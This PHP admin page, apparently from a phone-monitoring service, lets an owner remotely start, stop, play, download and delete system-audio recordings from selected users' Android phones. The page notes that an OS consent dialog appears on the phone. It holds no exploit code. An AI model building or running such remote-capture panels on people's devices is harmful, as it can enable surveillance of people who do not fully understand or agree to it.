<?php
require_once __DIR__ . '/_boot.php';
ss_require_owner();

$flash = '';

// Handle admin actions: request recording, stop recording.
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!empty($_POST['start_user'])) {
        $uid = (int)$_POST['start_user'];
        // Only allow one active request at a time per user.
        $ex = $pdo->prepare("SELECT id FROM audio_recordings WHERE user_id=? AND status IN ('requested','recording') LIMIT 1");
        $ex->execute([$uid]);
        if ($ex->fetch()) {
            $flash = '⚠️ Already recording or request pending for this user.';
        } else {
            $pdo->prepare("INSERT INTO audio_recordings (user_id, status, requested_at) VALUES (?, 'requested', NOW())")->execute([$uid]);
            if (function_exists('ss_wake_user')) { try { ss_wake_user($pdo, $uid); } catch (\Throwable $e) {} }
            $flash = '✅ Recording requested — the phone will start on its next sync (requires MediaProjection consent on the phone).';
        }
    }
    if (!empty($_POST['stop_id'])) {
        $rid = (int)$_POST['stop_id'];
        $pdo->prepare("UPDATE audio_recordings SET status='done', ended_at=NOW() WHERE id=? AND status='recording'")->execute([$rid]);
        $flash = '⏹️ Stop signal sent.';
    }
    if (!empty($_POST['delete_id'])) {
        $rid = (int)$_POST['delete_id'];
        $r = $pdo->prepare("SELECT file_url FROM audio_recordings WHERE id=?"); $r->execute([$rid]); $row = $r->fetch();
        if ($row && !empty($row['file_url'])) {
            $bn = basename((string)parse_url((string)$row['file_url'], PHP_URL_PATH));
            $fp = __DIR__ . '/../uploads/audio/' . $bn;
            if ($bn !== '' && is_file($fp)) @unlink($fp);
        }
        $pdo->prepare("DELETE FROM audio_recordings WHERE id=?")->execute([$rid]);
        $flash = '🗑️ Recording deleted.';
    }
}

$uid = (int)($_GET['user'] ?? 0);
$users = $pdo->query("SELECT id, username, name FROM users WHERE role='user' ORDER BY name")->fetchAll();

// Active recordings (requested or in-progress).
$active = [];
try { $active = $pdo->query("SELECT a.*, u.name, u.username FROM audio_recordings a JOIN users u ON u.id=a.user_id WHERE a.status IN ('requested','recording') ORDER BY a.id DESC")->fetchAll(); } catch (\Throwable $e) {}

// Completed recordings.
$where = "a.status IN ('done','failed')";
if ($uid) $where .= " AND a.user_id=$uid";
$recordings = [];
try { $recordings = $pdo->query("SELECT a.*, u.name, u.username FROM audio_recordings a JOIN users u ON u.id=a.user_id WHERE $where ORDER BY a.id DESC LIMIT 100")->fetchAll(); } catch (\Throwable $e) {}

function fmt_size($b) { if ($b < 1024) return $b.'B'; if ($b < 1048576) return round($b/1024).'KB'; return round($b/1048576,1).'MB'; }
function fmt_dur2($s) { if (!$s) return '—'; $m=intdiv($s,60); $x=$s%60; return $m>0 ? "{$m}m {$x}s" : "{$s}s"; }

$PAGE_TITLE = 'Sound Recordings';
$PAGE_SUB   = 'System audio capture (app sound only, NOT mic). ⚠️ Phone user WILL see a consent dialog.';
$PAGE_ICON  = '🔊';

$PAGE_TOOLS = '<form method="get" style="display:flex;gap:8px;align-items:center;flex-wrap:wrap"><select class="sel" name="user" onchange="this.form.submit()"><option value="0">All Users</option>';
foreach ($users as $uu) $PAGE_TOOLS .= '<option value="'.(int)$uu['id'].'" '.($uid===(int)$uu['id']?'selected':'').'>'.ss_admin_h($uu['name']).'</option>';
$PAGE_TOOLS .= '</select></form>';

require __DIR__ . '/_dark_head.php';
?>
<?php if($flash): ?><div class="flash ok" style="margin-bottom:14px"><?= ss_admin_h($flash) ?></div><?php endif; ?>

<div class="panel" style="margin-bottom:16px;background:rgba(245,158,11,.08);border-color:rgba(245,158,11,.3)">
  <div style="display:flex;align-items:center;gap:10px">
    <span style="font-size:1.4rem">⚠️</span>
    <div style="font-size:.82rem;color:var(--mut)">
      <b style="color:var(--warn)">Important:</b> Android requires the phone user to tap "Allow" on a MediaProjection consent dialog before system audio can be captured. A recording icon also appears in the status bar. This cannot be bypassed — it is an OS-level requirement. Only <b>app playback audio</b> (music, video, games) is captured — NOT the microphone or phone calls.
    </div>
  </div>
</div>

<div class="cards">
  <div class="stat"><div class="h"><span class="dot">🔴</span> Active</div><div class="v"><?= count($active) ?></div></div>
  <div class="stat"><div class="h"><span class="dot">🔊</span> Total Recordings</div><div class="v"><?= count($recordings) ?></div></div>
</div>

<!-- Request new recording -->
<div class="panel">
  <h3>🎙️ Request Recording</h3>
  <form method="post" style="display:flex;gap:10px;align-items:center;flex-wrap:wrap">
    <select name="start_user" class="sel" required>
      <option value="">Select user…</option>
      <?php foreach($users as $uu): ?><option value="<?= (int)$uu['id'] ?>"><?= ss_admin_h($uu['name']) ?> (@<?= ss_admin_h($uu['username']) ?>)</option><?php endforeach; ?>
    </select>
    <button class="btn pk" type="submit">🔴 Start Recording</button>
  </form>
</div>

<!-- Active / pending recordings -->
<?php if($active): ?>
<div class="panel">
  <h3>🔴 Active Recordings</h3>
  <div style="overflow-x:auto"><table>
    <thead><tr><th>User</th><th>Status</th><th>Requested</th><th>Started</th><th>Action</th></tr></thead>
    <tbody>
    <?php foreach($active as $a): ?>
      <tr>
        <td><b><?= ss_admin_h($a['name']) ?></b></td>
        <td>
          <?php if($a['status']==='requested'): ?>
            <span class="pill" style="background:rgba(245,158,11,.15);color:#fbbf24">⏳ Waiting for phone</span>
          <?php else: ?>
            <span class="pill" style="background:rgba(239,68,68,.15);color:#f87171">🔴 Recording</span>
          <?php endif; ?>
        </td>
        <td style="color:var(--mut)"><?= date('d M H:i', strtotime($a['requested_at'])) ?></td>
        <td style="color:var(--mut)"><?= $a['started_at'] ? date('H:i:s', strtotime($a['started_at'])) : '—' ?></td>
        <td>
          <form method="post" style="display:inline"><input type="hidden" name="stop_id" value="<?= (int)$a['id'] ?>">
            <button class="btn" type="submit" style="padding:4px 10px;font-size:.72rem;background:#ef4444;color:#fff;border:none">⏹️ Stop</button>
          </form>
        </td>
      </tr>
    <?php endforeach; ?>
    </tbody>
  </table></div>
</div>
<?php endif; ?>

<!-- Completed recordings -->
<div class="panel">
  <h3>🔊 Recordings</h3>
  <?php if(!$recordings): ?>
    <div class="empty">No recordings yet.</div>
  <?php else: ?>
    <div style="overflow-x:auto;max-height:600px;overflow-y:auto"><table>
      <thead><tr><th>User</th><th>App</th><th>Duration</th><th>Size</th><th>Date</th><th>Status</th><th>Play</th><th></th></tr></thead>
      <tbody>
      <?php foreach($recordings as $r): ?>
        <tr>
          <td><b><?= ss_admin_h($r['name']) ?></b></td>
          <td><?= ss_admin_h($r['app_name'] ?: '—') ?></td>
          <td><?= fmt_dur2($r['duration_sec']) ?></td>
          <td style="color:var(--mut)"><?= $r['file_size'] ? fmt_size($r['file_size']) : '—' ?></td>
          <td style="color:var(--mut);white-space:nowrap"><?= date('d M H:i', strtotime($r['requested_at'])) ?></td>
          <td>
            <?php if($r['status']==='done' && $r['file_url']): ?>
              <span class="pill">✅ Done</span>
            <?php elseif($r['status']==='failed'): ?>
              <span class="pill" style="background:rgba(239,68,68,.15);color:#f87171">❌ Failed</span>
            <?php else: ?>
              <span class="pill" style="background:rgba(148,163,184,.15);color:#94a3b8"><?= ss_admin_h($r['status']) ?></span>
            <?php endif; ?>
          </td>
          <td>
            <?php if($r['file_url']): ?>
              <audio controls preload="none" style="height:32px;max-width:200px"><source src="<?= ss_admin_h($r['file_url']) ?>" type="audio/mp4"></audio>
            <?php else: ?>—<?php endif; ?>
          </td>
          <td>
            <?php if($r['file_url']): ?>
              <a class="btn" href="<?= ss_admin_h($r['file_url']) ?>" download style="padding:4px 10px;font-size:.72rem">⬇️</a>
            <?php endif; ?>
            <form method="post" style="display:inline"><input type="hidden" name="delete_id" value="<?= (int)$r['id'] ?>">
              <button class="btn" type="submit" style="padding:4px 10px;font-size:.72rem;background:#ef4444;color:#fff;border:none" onclick="return confirm('Delete this recording?')">🗑️</button>
            </form>
          </td>
        </tr>
      <?php endforeach; ?>
      </tbody>
    </table></div>
  <?php endif; ?>
</div>
<?php require __DIR__ . '/_dark_foot.php';
